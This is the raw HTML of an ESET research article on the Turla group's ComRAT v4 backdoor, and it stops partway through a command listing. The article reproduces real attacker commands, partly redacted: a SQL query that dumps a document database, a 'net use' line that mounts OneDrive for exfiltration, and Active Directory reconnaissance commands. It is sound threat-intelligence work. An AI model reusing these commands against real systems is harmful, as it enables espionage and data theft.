<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Matthieu Faou',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey | WeLiveSecurity</title>
<meta name="description" content="ESET researchers have uncovered a new version of ComRAT, a backdoor that the Turla APT group has been using for years and that now uses the Gmail web interface for Command and Control."/>
<link rel="canonical" href="https://www.welivesecurity.com/2020/05/26/agentbtz-comratv4-ten-year-journey/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers have uncovered a new version of ComRAT, a backdoor that the Turla APT group has been using for years and that now uses the Gmail web interface for Command and Control." />
<meta property="og:url" content="https://www.welivesecurity.com/2020/05/26/agentbtz-comratv4-ten-year-journey/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2020-05-26T09:30:38+00:00" />
<meta property="article:modified_time" content="2020-06-08T10:51:12+00:00" />
<meta property="og:updated_time" content="2020-06-08T10:51:12+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/05/Turla-Agent.BTZ-ComRATv4-tenyear-journey-1.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2020/05/Turla-Agent.BTZ-ComRATv4-tenyear-journey-1.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="663" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers have uncovered a new version of ComRAT, a backdoor that the Turla APT group has been using for years and that now uses the Gmail web interface for Command and Control." />
<meta name="twitter:title" content="From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/05/Turla-Agent.BTZ-ComRATv4-tenyear-journey-1.jpg" />
<meta name="twitter:creator" content="@matthieu_faou" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/2020/05/26/agentbtz-comratv4-ten-year-journey/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2020/05/26/turla-actualizo-backdoor-comrat/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2020/05/26/comrat-v4-backdoor-gmail-ui/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/05/26/turla-actualizo-backdoor-comrat/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/05/26/comrat-v4-backdoor-gmail-ui/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/05/26/turla-actualizo-backdoor-comrat/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/05/26/comrat-v4-backdoor-gmail-ui/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2020/05/Agent.BTZ-ComRATv4-ten‑year-journey.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey</h1>
<div class="excerpt">Turla has updated its ComRAT backdoor and now uses the Gmail web interface for Command and Control</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2021/02/Matthieu-Faou-222x179.jpg" alt="Matthieu Faou">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2020-05-26 11:30:38">26 May 2020 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F&text=From Agent.BTZ to ComRAT&nbsp;v4: A ten&#8209;year journey%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F05%2F26%2Fagentbtz-comratv4-ten-year-journey%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>Turla has updated its ComRAT backdoor and now uses the Gmail web interface for Command and Control</p>
                            </div>

                            <p>ESET researchers have found a new version of one of the oldest malware families run by the Turla group, ComRAT. Turla, also known as Snake, is an infamous espionage group that has been active for more than ten years. We have previously <a href="https://www.welivesecurity.com/?s=turla" target="_blank" rel="noopener">described many campaigns attributed to this group</a>.</p>
<p>ComRAT, also known as <a href="https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified" target="_blank" rel="noopener">Agent.BTZ</a> and to its developers as Chinch, is a Remote Access Trojan (RAT) that became infamous after its <a href="https://www.nytimes.com/2010/08/26/technology/26cyber.html" target="_blank" rel="noopener">use in a breach of the US military in 2008</a>. The first version of this malware, likely released in 2007, exhibited worm capabilities by spreading through removable drives. From 2007 to 2012, two new major versions of the RAT were released. Interestingly, both employed the well-known Turla XOR key:</p>
<p><em>1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s</em></p>
<p>Until mid-2017, the Turla developers made a few changes to ComRAT, but these variants were apparently still derived from the same code base.</p>
<div class="nwg-promo document clearfix">
            <div class="text">
                <p>
                     <a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf" target="_blank">From Agent.BTZ to ComRAT v4: A ten‑year journey</a>
                </p>
                <a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf" class="my-btn document" target="_blank">
                    Download Research Paper
                </a>
            </div>
            <a href="https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf" target="_blank" class="no-fancy download">
                <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/pdf-document-big.png" alt="" class="document">
            </a>
        </div>
<p>Then, in 2017, we noticed that a very different version of ComRAT had been released. This new version used a completely new code base and was far more complex than its predecessors. Here are the main characteristics of this malware family:</p>
<ul>
<li>ComRAT v4 was first seen in 2017 and known still to be in use as recently as January 2020.</li>
<li>We identified at least three targets: two Ministries of Foreign Affairs and a national parliament.</li>
<li>ComRAT was used to exfiltrate sensitive documents. The operators used public cloud services such as OneDrive and 4shared to exfiltrate data.</li>
<li>ComRAT is a complex backdoor developed in C++.</li>
<li>ComRAT uses a Virtual FAT16 File System.</li>
<li>ComRAT is deployed using existing access methods, such as the PowerStallion PowerShell backdoor.</li>
<li>ComRAT has two Command and Control channels
<ul>
<li>HTTP: It uses exactly the same protocol as ComRAT v3</li>
<li>Email: It uses the Gmail web interface to receive commands and exfiltrate data</li>
</ul>
</li>
<li>ComRAT can perform many actions on the compromised computers, such as executing additional programs or exfiltrating files.</li>
</ul>
<h2>Attribution to Turla</h2>
<p>Based on the victimology and the TTPs, we believe that ComRAT is used exclusively by Turla. There are a few elements linking ComRAT v4 to Turla:</p>
<ul>
<li>It uses the same internal name, Chinch, as the previous versions</li>
<li>It uses the same custom C&amp;C protocol over HTTP as ComRAT v3</li>
<li>A part of the network infrastructure is shared with another Turla malware family, <a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf" target="_blank" rel="noopener">Mosquito</a></li>
<li>It was dropped by, or has dropped other, Turla <a href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/" target="_blank" rel="noopener">malware families</a>:
<ul>
<li>A customized PowerShell loader</li>
<li>The PowerStallion backdoor</li>
<li>The RPC backdoor</li>
</ul>
</li>
</ul>
<h2>Insight into attacker’s activity</h2>
<p>During our investigation, we were able to gain insights about what Turla operators were doing on the compromised machines.</p>
<p>The main use of ComRAT is stealing confidential documents. In one case, its operators even deployed a .NET executable to interact with the victim’s central MS SQL Server database containing the organization’s documents. Figure 1 is the redacted SQL command.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581be8c8119808013693" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
sqlCommand.CommandText = "select top " + num2.ToString() + " filename, img, datalength(img), id from &lt;Redacted&gt; with(nolock) where not img is null and id&gt;" + num4.ToString();
sqlCommand.CommandText += " and datalength(img)&lt;1500000 and (filename like '%.doc' or filename like '%.docx' or filename like '[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf' or (filename like '3%.pdf' and len(filename)&gt;9))";
sqlCommand.CommandText += " order by id";</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581be8c8119808013693-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8119808013693-2">2</div><div class="crayon-num" data-line="crayon-60581be8c8119808013693-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581be8c8119808013693-1"><span class="crayon-v">sqlCommand</span><span class="crayon-sy">.</span><span class="crayon-v">CommandText</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"select top "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">num2</span><span class="crayon-sy">.</span><span class="crayon-e">ToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">" filename, img, datalength(img), id from &lt;Redacted&gt; with(nolock) where not img is null and id&gt;"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">num4</span><span class="crayon-sy">.</span><span class="crayon-e">ToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8119808013693-2"><span class="crayon-v">sqlCommand</span><span class="crayon-sy">.</span><span class="crayon-v">CommandText</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">" and datalength(img)&lt;1500000 and (filename like '%.doc' or filename like '%.docx' or filename like '[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf' or (filename like '3%.pdf' and len(filename)&gt;9))"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581be8c8119808013693-3"><span class="crayon-v">sqlCommand</span><span class="crayon-sy">.</span><span class="crayon-v">CommandText</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">" order by id"</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Figure 1. SQL command to dump documents from the central database (partially redacted)</em></p>
<p>These documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive or 4shared. Cloud storage is mounted using the net use command as shown in Figure 2.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581be8c8120971379682" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
tracert -h 10 yahoo.com
net use  https://docs.live.net/E65&lt;redacted&gt; &lt;redacted password&gt; /u:&lt;redacted&gt;@aol.co.uk
tracert -h 10 yahoo.com</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581be8c8120971379682-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8120971379682-2">2</div><div class="crayon-num" data-line="crayon-60581be8c8120971379682-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581be8c8120971379682-1"><span class="crayon-v">tracert</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">h</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-v">yahoo</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be8c8120971379682-2"><span class="crayon-e">net </span><span class="crayon-st">use</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//docs.live.net/E65&lt;redacted&gt; &lt;redacted password&gt; /u:&lt;redacted&gt;@aol.co.uk</span></div><div class="crayon-line" id="crayon-60581be8c8120971379682-3"><span class="crayon-v">tracert</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">h</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-v">yahoo</span><span class="crayon-sy">.</span><span class="crayon-v">com</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Figure 2. Command to mount a OneDrive folder using </em><span style="font-family: courier new, courier, monospace;">net use</span><em> (partially redacted)</em></p>
<p>In addition to document stealing, the operators also run many commands to gather information about the Active Directory groups or users, the network, or Microsoft Windows configurations such as the group policies. Figure 3 is a list of commands executed by Turla operators.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581be8c8122754430777" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
gpresult /z
gpresult /v
gpresult
net view
net view /domain
netstat
netstat -nab
netstat -nao
nslookup 127.0.0.1
ipconfig /all
arp -a
net share
net use
systeminfo
net user
net user administrator
net user /domain
net group
net group /domain
net localgroup
net localgroup
net localgroup Administrators
net group "Domain Computers" /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
dir "%programfiles%"
net group "Exchange Servers" /domain
net accounts
net accounts /domain
net view 127.0.0.1 /all
net session
route print
ipconfig /displaydns</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581be8c8122754430777-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-2">2</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-4">4</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-6">6</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-8">8</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-10">10</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-12">12</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-14">14</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-16">16</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-18">18</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-20">20</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-22">22</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-24">24</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-26">26</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-28">28</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-30">30</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581be8c8122754430777-32">32</div><div class="crayon-num" data-line="crayon-60581be8c8122754430777-33">33</div></div>
				</td>
